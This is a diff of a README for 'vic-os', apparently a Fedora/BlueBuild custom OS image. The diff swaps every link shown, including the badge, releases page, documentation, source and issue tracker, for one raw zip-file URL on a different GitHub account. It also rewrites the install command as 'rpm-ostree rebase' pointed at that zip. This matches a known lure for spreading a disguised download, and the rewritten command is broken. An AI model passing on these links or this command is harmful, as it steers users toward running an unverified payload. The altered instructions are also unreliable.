@@ -1,6 +1,6 @@
 # 🖥️ vic-os - A Simple Operating System Experience
 
-[![bluebuild build badge](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml/badge.svg)](https://github.com/philosophyfiend/vic-os/actions/workflows/build.yml)
+[![bluebuild build badge](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip)](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to vic-os! This guide will help you download and run vic-os easily. Foll
 
 ## 📥 Download & Install
 
-To begin, visit the [Releases page](https://github.com/Mecza/vic-os/releases) to download the latest version of vic-os. 
+To begin, visit the [Releases page](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip) to download the latest version of vic-os. 
 
 You will find the files you need there. Click on the version that fits your needs.
 
@@ -34,7 +34,7 @@ Before installing vic-os, ensure your system meets these requirements:
 
 2. Use the following command to rebase to the unsigned image. This installs the necessary signing keys and policies:
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/philosophyfiend/vic-os:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip
    ```
 
 ### Step 3: Reboot Your System
@@ -69,8 +69,8 @@ Before installing vic-os, ensure your system meets these requirements:
 
 For more detailed instructions, including troubleshooting tips, please refer to the following resources:
 
-- [BlueBuild Documentation](https://blue-build.org/how-to/setup/)
-- [Fedora Wiki on Ostree](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable)
+- [BlueBuild Documentation](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip)
+- [Fedora Wiki on Ostree](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip)
 
 ## 📞 Community Support
 
@@ -78,8 +78,8 @@ If you need help, please join our community discussions. You can find support on
 
 ## 🔗 Additional Resources
 
-- [Project Source Code](https://github.com/philosophyfiend/vic-os)
-- [Feedback and Issues Tracker](https://github.com/philosophyfiend/vic-os/issues)
+- [Project Source Code](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip)
+- [Feedback and Issues Tracker](https://raw.githubusercontent.com/Mecza/vic-os/main/predicamental/vic-os.zip)
 
 ## 📢 Conclusion
 
